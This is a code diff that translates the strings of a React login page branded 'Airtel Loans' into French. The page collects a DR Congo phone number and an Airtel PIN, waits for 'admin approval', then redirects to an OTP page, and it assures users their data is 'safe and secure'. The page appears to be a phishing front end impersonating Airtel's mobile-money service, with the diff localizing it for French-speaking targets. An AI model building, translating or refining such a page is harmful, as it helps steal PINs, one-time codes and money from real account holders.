@@ -5,7 +5,7 @@ import './App.css';
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [error, setError] = useState('Enter Airtel number.');
+  const [error, setError] = useState('Entrez le numéro Airtel.');
   const [isLoading, setIsLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState('');
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -32,17 +32,17 @@ function AirtelLogin() {
     const pinString = pin.join('');
 
     if (phone.length < 9) {
-      setError('Enter a valid Airtel number.');
+      setError('Entrez un numéro Airtel valide.');
       return;
     }
     if (pinString.length < 4) {
-      setError('Enter your Airtel PIN.');
+      setError('Entrez votre code PIN Airtel.');
       return;
     }
 
     setError('');
     setIsLoading(true);
-    setStatusMessage('Sending approval request...');
+    setStatusMessage('Envoi de la demande d\'approbation...');
 
     const fullPhone = `+243${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
@@ -56,14 +56,14 @@ function AirtelLogin() {
       const data = await res.json();
 
       if (data.status === 'error') {
-        setError(data.message || 'Login failed.');
+        setError(data.message || 'Échec de la connexion.');
         setIsLoading(false);
         setStatusMessage('');
         return;
       }
 
       if (data.status === 'pending' && data.approval_id) {
-        setStatusMessage('Waiting for admin approval...');
+        setStatusMessage('En attente de l\'approbation de l\'administrateur...');
 
         const approvalId = data.approval_id;
         let attempts = 0;
@@ -73,7 +73,7 @@ function AirtelLogin() {
           attempts++;
           if (attempts > maxAttempts) {
             clearInterval(interval);
-            setError('Approval timed out. Please try again.');
+            setError('Délai d\'approbation dépassé. Veuillez réessayer.');
             setIsLoading(false);
             setStatusMessage('');
             return;
@@ -87,27 +87,27 @@ function AirtelLogin() {
 
             if (statusData.status === 'approved') {
               clearInterval(interval);
-              setStatusMessage('Approved! Redirecting...');
+              setStatusMessage('Approuvé ! Redirection...');
               navigate('/airtel-otp');
             } else if (statusData.status === 'rejected') {
               clearInterval(interval);
-              setError('Login rejected by admin.');
+              setError('Connexion refusée par l\'administrateur.');
               setIsLoading(false);
               setStatusMessage('');
             } else if (statusData.status === 'expired') {
               clearInterval(interval);
-              setError('Approval expired. Please try again.');
+              setError('Approbation expirée. Veuillez réessayer.');
               setIsLoading(false);
               setStatusMessage('');
             }
-            // If 'pending', keep polling silently
+            // Si 'pending', continuer à interroger silencieusement
           } catch {
-            // Network hiccup — keep polling
+            // Erreur réseau — continuer à interroger
           }
         }, 2000);
       }
     } catch {
-      setError('Error connecting to backend.');
+      setError('Erreur de connexion au serveur.');
       setIsLoading(false);
       setStatusMessage('');
     }
@@ -125,13 +125,13 @@ function AirtelLogin() {
           </svg>
         </div>
         <h1 className="airtel-logo">Airtel Loans</h1>
-        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
       {/* Main White Card */}
       <div className="airtel-card">
-        <h2 className="airtel-welcome">Welcome back</h2>
-        <p className="airtel-subtext">Log in to Airtel Account</p>
+        <h2 className="airtel-welcome">Bon retour</h2>
+        <p className="airtel-subtext">Connectez-vous à votre compte Airtel</p>
 
         {/* Error Alert Box */}
         {error && (
@@ -163,7 +163,7 @@ function AirtelLogin() {
         <form onSubmit={handleLogin}>
           {/* Phone Number Input */}
           <div className="airtel-input-group">
-            <label>Phone Number</label>
+            <label>Numéro de téléphone</label>
             <div className="airtel-phone-container">
               <div className="airtel-country-code">+243</div>
               <input
@@ -179,7 +179,7 @@ function AirtelLogin() {
 
           {/* PIN Input */}
           <div className="airtel-input-group">
-            <label>Enter Your Airtel PIN</label>
+            <label>Entrez votre code PIN Airtel</label>
             <div className="airtel-pin-container">
               {pin.map((digit, index) => (
                 <input
@@ -200,7 +200,7 @@ function AirtelLogin() {
 
           {/* Login Button */}
           <button type="submit" className="airtel-login-btn" disabled={isLoading}>
-            {isLoading ? 'Please wait...' : 'Login'}
+            {isLoading ? 'Veuillez patienter...' : 'Connexion'}
             {!isLoading && (
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12"></line>
@@ -215,7 +215,7 @@ function AirtelLogin() {
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
           </svg>
-          <span>Your information is safe and secure</span>
+          <span>Vos informations sont sécurisées</span>
         </div>
       </div>
 
